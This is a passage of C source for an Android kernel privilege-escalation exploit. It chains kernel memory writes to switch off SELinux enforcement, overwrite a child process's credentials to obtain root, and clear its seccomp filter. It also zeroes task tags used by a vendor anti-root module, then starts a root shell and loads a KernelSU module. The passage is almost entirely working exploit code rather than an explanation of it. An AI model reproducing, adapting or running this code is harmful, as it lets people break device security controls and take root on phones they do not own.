      (ssize_t)sizeof(code)) {
    return 0;
  }
  pr_info("seccomp finit_module probe = 0x%x\n", code);
  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
   * With init_cred + permissive SELinux a real probe fails with a normal
   * errno instead. */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
  return 1;
}

static int verify_leaf_dir_stage(void *context) {
  struct w3_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;

  uint32_t report = 0;
  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
      (ssize_t)sizeof(report)) {
    return 0;
  }
  size_t len = (report >> 8) & 0xff;
  unsigned char c0 = (unsigned char)(report & 0xff);
  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
  if (len == 8) {
    stage->leaf_to_target8 = 1;
    pr_info("leaf=1 write lands on [target+8]\n");
    return 1;
  }
  if (len == 0) {
    stage->leaf_to_target8 = 0;
    pr_info("leaf=1 write lands on [target]\n");
    return 1;
  }
  if (len == 15) {
    pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
    return 0;
  }
  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
  return 0;
}

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  signal(SIGPIPE, SIG_IGN);
  set_limit();
  init_cpu_config();
  init_runtime_paths();
  write_root_script();

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_p0_profile();
  pin_to_core(CORE);
  pr_info("main thread running on cpu=%d\n", sched_getcpu());

  timer_reset();
  TIMER("exploit start");

  /* W1: disable SELinux before task discovery. untrusted_app may not be able
   * to read enforce while it is still enforcing, so attempt W1 regardless. */
  int selinux_ok = check_selinux_off();
  if (!selinux_ok) {
    if (!enforce_readable()) {
      pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
    }
    TIMER("pre-W1 drain");
    selinux_ok = retry_write_stage(
        "W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15, 100000,
        verify_selinux_stage, NULL, 0);
    if (!selinux_ok) {
      pr_warning("Write 1 failed\n");
      return 1;
    }
    TIMER("Write 1 complete");
  } else {
    pr_success("SELinux already permissive\n");
  }

  /* W2: overwrite the child credential via the task leaked by perf. */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  struct w2_stage_context w2_context = { .pipes = &pipes };
  pid_t child = -1;
  uintptr_t child_task = 0;
  int child_alive = 1;
  int seccomp_ok = 0;

  /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
   * child, so respawn and redo instead of aborting. */
  for (int round = 1; round <= 3; round++) {
    if (round > 1) {
      pr_warning("W3 chain retry %d/3: respawning child\n", round);
      if (child > 0 && child_alive) {
        kill(-child, SIGKILL);
        waitpid(child, NULL, 0);
      }
      close(pipes.cmd_w); close(pipes.uid_r);
      child_alive = 1;
      seccomp_ok = 0;
    }

    child = spawn_child(&pipes);
    if (child < 0) {
      pr_warning("fork failed\n");
      return 1;
    }

    child_task = 0;
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
    TIMER("perf_find_task done");

    if (!child_task) {
      /* perf leaked nothing; respawn and retry once */
      pr_info("perf returned 0, retrying...\n");
      waitpid(child, NULL, 0);
      child = spawn_child(&pipes);
      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
      child_task = 0;
      read(pipes.task_r, &child_task, sizeof(child_task));
      close(pipes.task_r);
    }

    if (!child_task) {
      pr_warning("Cannot find task_struct (perf leak failed)\n");
      close(pipes.cmd_w);
      waitpid(child, NULL, 0);
      return 1;
    }

    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
    #ifdef VR_TAG_A_OFF
  /* ------------------------------------------------------------------
   * vivo vr.ko anti-root per-task bypass (ported from root.c)
   * ------------------------------------------------------------------
   * vr.ko tags every app-origin task at fork/clone time. When the task
   * later holds euid 0, the sys_exit tracepoint probe kills it. We must
   * strip the tag BEFORE W2 verify runs the child's getuid().
   *
   * This exploit primitive is 64-bit granular, so:
   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
   *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
   *     off the sys_exit slow-path immediately.
   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
   *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
   *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
   * ------------------------------------------------------------------ */
  {
    int vr_ok = 1;

    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
    vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
                          "VR: flags+tagA", 1, 1);

    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
    if (vr_ok) {
      uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
      vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
    }

    if (vr_ok) {
      pr_success("VR.ko per-task tags cleared\n");
    } else {
      pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
    }
  }
#endif

    pselect_child_node = 1;

    int got_root = retry_write_stage(
        "W2: cred", child_task + TASK_CRED_OFF, 2, 15, 50000,
        verify_w2_stage, &w2_context, 0);
    if (!got_root) {
      write(pipes.cmd_w, "X", 1);
      close(pipes.cmd_w); close(pipes.uid_r);
      pr_warning("W2 failed after 15 rounds\n");
      waitpid(child, NULL, 0);
      return 1;
    }

    /* W3: clear the child's seccomp filter for the independent root shell
     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
     * must be zeroed too; do both writes back-to-back with one probe
     * (real finit_module calls trip vendor root guards).
     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
     * probe to tell [target] from [target+8]. */
    if (!process_has_seccomp()) {
      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
      seccomp_ok = 1;
      break;
    }

    int tcp_writes = tcp_route_selected();
    struct w3_stage_context w3_context = {
      .pipes = &pipes,
      .leaf_to_target8 = !tcp_writes,
    };
    if (!tcp_writes) {
      int dir_ok = retry_write_stage(
          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
          verify_leaf_dir_stage, &w3_context, 1);
      if (!dir_ok) {
        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
      }
    }

    uintptr_t flags_target = w3_context.leaf_to_target8
      ? child_task - 8
      : child_task + TASK_THREAD_INFO_FLAGS_OFF;
    uintptr_t mode_target = w3_context.leaf_to_target8
      ? child_task + TASK_SECCOMP_OFF - 8
      : child_task + TASK_SECCOMP_OFF;

    for (int attempt = 1; attempt <= 6; attempt++) {
      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
      if (attempt == 1) slab_drain();
      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
      if (!routed) {
        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
      if (!routed) {
        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      int st = 0;
      if (waitpid(child, &st, WNOHANG) == child) {
        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
        child_alive = 0;
        break;
      }
      if (verify_seccomp_probe_stage(&w2_context)) {
        seccomp_ok = 1;
        break;
      }
      usleep(50000);
    }

    if (!seccomp_ok) {
      pr_warning("W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
      continue; /* respawn and redo the chain */
    }
    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
    break;
  }

  if (!seccomp_ok)
    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");

  sleep(2);
  TIMER("exploit complete");
  if (child_alive) {
    if (write(pipes.cmd_w, "G", 1) != 1)
      pr_warning("failed to start root shell (child exited early)\n");
  } else {
    pr_warning("skipping late-load: child died during W3\n");
  }
  close(pipes.cmd_w);
  if (child_alive) {
    /* The child only forks the independent root shell and exits fast; keep
     * a bounded wait in case it got stuck before the fork. */
    int waited_ms = 0;
    for (;;) {
      pid_t r = waitpid(child, NULL, WNOHANG);
      if (r == child || r < 0) break;
      if (waited_ms >= 45000) {
        pr_warning("child stuck before root shell handoff; killing group\n");
        kill(-child, SIGKILL);
        waitpid(child, NULL, 0);
        break;
      }
      usleep(100000);
      waited_ms += 100;
    }
  }
  close(pipes.uid_r);

  int kernelsu_ready = 0;
  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
    usleep(100000);
  }
  /* untrusted_app loses /proc/modules once enforcing is restored, so poll
   * the app-readable log for the loaded-module line (up to ~30s). */
  int ksu_log_loaded = 0;
  int ksu_log_failed = 0;
  for (int i = 0; i < 60 && !(ksu_log_loaded || ksu_log_failed); i++) {
    char ksu_log_path[320];
    snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
    FILE *lf = fopen(ksu_log_path, "r");
    if (lf) {
      char line[256];
      while (fgets(line, sizeof(line), lf)) {
        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
        if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
      }
      fclose(lf);
    }
    if (!(ksu_log_loaded || ksu_log_failed)) usleep(500000);
  }
  /* Module init re-enforces at the very end of kernelsu_init; wait up to
   * 20s for it. Denied read or value 1 both mean enforcing here. */
  int enforce_ok = 0;
  for (int i = 0; ksu_log_loaded && !enforce_ok && i < 200; i++) {
    int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
    if (efd < 0) {
      enforce_ok = 1;
      break;
    }
    char eb[4] = {0};
    ssize_t rn = read(efd, eb, sizeof(eb));
    close(efd);
    if (rn > 0 && eb[0] == '1') enforce_ok = 1;
    if (!enforce_ok) usleep(100000);
  }
  if (enforce_ok)
    pr_info("enforce=1 (enforcing)\n");
  else if (ksu_log_loaded)
    pr_warning("enforce=0 (still permissive)\n");
  kernelsu_ready = kernelsu_ready || ksu_log_loaded;

  /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
   * policy reload keeps it working after enforcing is back. */
  if (kernelsu_ready)
    pr_success("KernelSU ready\n");
  else if (ksu_log_failed)
    pr_warning("KernelSU module load failed\n");
  else if (seccomp_ok)
    pr_warning("temporary root ready; KernelSU module load pending\n");
  else
    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
  return 0;
}

int main(int argc, char **argv) { return run_exploit(argc, argv); }
